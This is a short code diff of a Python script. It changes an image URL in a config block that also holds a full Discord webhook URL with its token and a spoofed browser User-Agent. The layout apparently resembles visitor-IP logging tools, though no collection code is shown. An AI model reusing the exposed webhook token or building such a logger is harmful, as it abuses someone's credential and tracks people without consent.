@@ -12,7 +12,8 @@ REQUEST_HEADERS = {
     "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
 }
 WEBHOOK_URL = "https://discord.com/api/webhooks/1395482725166747812/WAJa1ZBNvEZxT-7t6_-FFnex7S5cZNVTP3QpusMaWemNLYegA-9OeOBqoGvSEIy1KgBH"
-"image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ3wxJ0c-jC6VcDASO9aiDWD9zWAeJLKrS5gg&s"
+"image": "https://cdn.pixabay.com/photo/2024/05/26/10/15/bird-8788491_1280.jpg"
+
 "imageArgument": True
 def make_post_request(api_url: str, data: dict[str, str]) -> int:
     if not api_url.startswith(("http", "https")):
